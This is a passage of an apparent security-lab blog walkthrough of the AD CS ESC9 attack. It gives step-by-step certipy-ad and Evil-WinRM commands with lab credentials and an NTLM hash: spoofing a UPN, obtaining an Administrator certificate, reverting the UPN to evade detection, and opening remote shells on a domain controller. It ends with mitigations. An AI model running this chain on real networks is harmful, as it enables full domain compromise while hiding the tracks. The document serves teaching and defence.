+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad account update -u raj@ignite.local -password Password@1 -user sanjeet -upn Administrator -dc-ip 192.168.1.16</pre>
+<p><span style="color: #000000">This changes the User Principal Name (UPN) of sanjeet to Administrator. When StrongCertificateBindingEnforcement is set to 0, Active Directory maps certificate logins based only on UPN, enabling this impersonation trick.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1pAFspsG5MWqP5P-lm9XrhiDkP84ORHRWmMSkrKJsgyRqt6oZ7LBTBLRbDCputX44uSQEFJVdSbL7_DQZkrvS70Kk2umUFGh32kBgMpqritD-bcXkEPnDX9-fBNybhCwQ94HlfKCrxe8hwDmR329OkSXu-bChOaN5P0CLX9SO1_MmT-Q4P366qKtt4CTm/s16000/21.png"/></span></p>
+<h4><span style="color: #000000">Request Certificate as Administrator</span></h4>
+<p><span style="color: #000000">With the UPN spoofed, request a certificate using the vulnerable template:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad req -u sanjeet@ignite.local -hashes 64fbae31cc352fc26af97cbdef151e03 -ca ignite-DC1-CA -template ESC9 -dc-ip 192.168.1.16</pre>
+<p><span style="color: #000000">The administrator enrolls a certificate using the ESC9 template. Since this template disables security checks and trusts the UPN field, the CA issues a certificate trusted by AD even though Sanjeet requested it.</span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhEoI9sI02kH5KmGplYOcDYdVMXrZIRqHV5rSC6JfCYsUywbu-Tq1esbDOtlG6CN2nUGkcpswMQWg9Lt3iknS21CRLckYMbrop1lVsSlGvFAtD4zrPblX_SiyCRl21UfmLiM-zlZXToK7QLKM0Wa9o7PFegbz02SPSTYiKVDxFOYDrAH8qVZDwIcbmcHLti/s16000/22.png" alt="ADCS ESC9 Exploit" width="1729" height="270"/></span></p>
+<h4><span style="color: #000000">Revert Proxy UPN to Original</span></h4>
+<p><span style="color: #000000">After the certificate is issued, revert the proxy account’s UPN for stealth:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad account update -u raj@ignite.local -p Password@1 -user sanjeet -upn sanjeet@ignite.local -dc-ip 192.168.1.16</pre>
+<p><span style="color: #000000">This restores sanjeet’s UPN to its original value, making it harder to detect the attack. The issued certificate remains valid for Administrator, but the change hides the manipulation of the proxy account.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgs6ECeLTx4M9Krop9eWuffYRV_Hk1SqUyZXy1IMoncRVfCTQdxgCvXFzoDexDBBzsfggvsbakmRkzY9NrfczSmXTe_NpUGyERArhjhvqqiAwgqa0BO3B5QiSNpSIJLH0OktQ2YZVnzy8Zoqu9rBn5DsVHIFjCI9o5pOD2U7h1CTDuReVGLQsgcJAfQ-jdi/s16000/23.png"/></span></p>
+<h4><span style="color: #000000">Authenticate as Administrator</span></h4>
+<p><span style="color: #000000">Authenticate as Administrator using the issued certificate:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad auth -pfx administrator.pfx -domain ignite.local</pre>
+<p><span style="color: #000000">This uses the forged certificate to perform certificate-based authentication (PKINIT). Since the certificate contains Administrator as the UPN and AD allows UPN-only mapping, it grants a TGT for the real Administrator account.</span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheGxbvO3dyY6P_mKok6t9sw-kMVAGPm7o4OBGm7-ZNkBVCGiFMQS9OYpUEJaQtDO2N4bkOruL2TWYw80pYPLwJHE-YOvb2Bu1YzwvWB5wulHc9e12eiGEXUCIU85n9Lftb5AUPxj3NLXwJqfXyshjFRvW3tN9Uq_zqDhK_IMwI-pMYYhFNkRW3RJSuSJAo/s16000/24.png" alt="ADCS ESC9 Exploit" width="1372" height="264"/></span></p>
+<h3><span style="color: #800000">Post Exploitation</span></h3>
+<h4><span style="color: #800000">Lateral Movement &amp; Privilege Escalation using certipy LDAP Shell as Administrator</span></h4>
+<p><span style="color: #000000">Use your Administrator access to launch an LDAP shell:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad auth -pfx administrator.pfx -domain ignite.local -ldap-shell -dc-ip 192.168.1.16</pre>
+<p><span style="color: #000000">This opens an interactive LDAP session authenticated as Administrator. You can now execute powerful operations like DCSync, change group memberships, or establish persistence across the domain.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhxVBSnzCe-HpZjDTTKcixGL0Jz867WOBiYFlyrzqUi854mDyydUPgVbyDZo8supz6z1eRY1FaXbJBnozTNXE_20t3CTTsGwbJ2EW8Ucgh6OM6iM4mBJVWJNcUUWriYeuzur1uR2W997qBKEC9kN3g763o9RxCuFC1GClukm557RL3vXravNdpFEPDZgSSc/s16000/25.png"/></span></p>
+<h4><span style="color: #800000">Lateral Movement &amp; Privilege Escalation using Evil-Winrm</span></h4>
+<p><span style="color: #000000">If you’ve captured the Administrator’s NTLM hash, connect using Evil-WinRM:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.1.16 -u administrator -H 64fbae31cc352fc26af97cbdef151e03</pre>
+<p><span style="color: #000000">This launches a full interactive remote shell on the domain controller. At this point, you have achieved complete domain compromise through the ESC9 abuse chain.</span></p>
+<p><span style="color: #000000"><strong> <img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEimLLmXLvZeSoGeAoHaAxJ0c5mY0psJPu1dLYWSoLOrwWXJ1BLUiZbHTy1W-afJA7bhWQQb28YkDzOhDkM76YJBGXt-fVI7CVKE2KIgqne9FELnGtSIIUcgQnGFvJEphCElkPh7wIclRh7uVPtr7M5-bxXAI7vW-7-oi0FFtS0Y2qQ2oyuk7XMhjO2ODNeW/s16000/26.png" alt="ADCS ESC9 Exploit" width="1172" height="296"/></strong></span></p>
+<h3><span style="color: #800000">Mitigation</span></h3>
+<ul>
+<li><span style="color: #000000">Set StrongCertificateBindingEnforcement = 2</span></li>
+<li><span style="color: #000000">Remove CT_FLAG_NO_SECURITY_EXTENSION from all active templates</span></li>
+<li><span style="color: #000000">Limit who can enroll in templates with Client Authentication EKUs</span></li>
+<li><span style="color: #000000">Audit certificate issuance (Event ID 4886/4887)</span></li>
+<li><span style="color: #000000">Monitor UPN changes and usage of shadow credentials</span></li>
+</ul>
+<p><span style="color: #000000"><strong>Author: </strong>MD Aslam is a dynamic Information Security leader committed to driving security excellence and mentoring teams to strengthen security across products, networks, and organizations. Contact <span style="color: #0000ff"><strong><a style="color: #0000ff" href="https://www.linkedin.com/in/md-aslam-7b04ab144">here</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
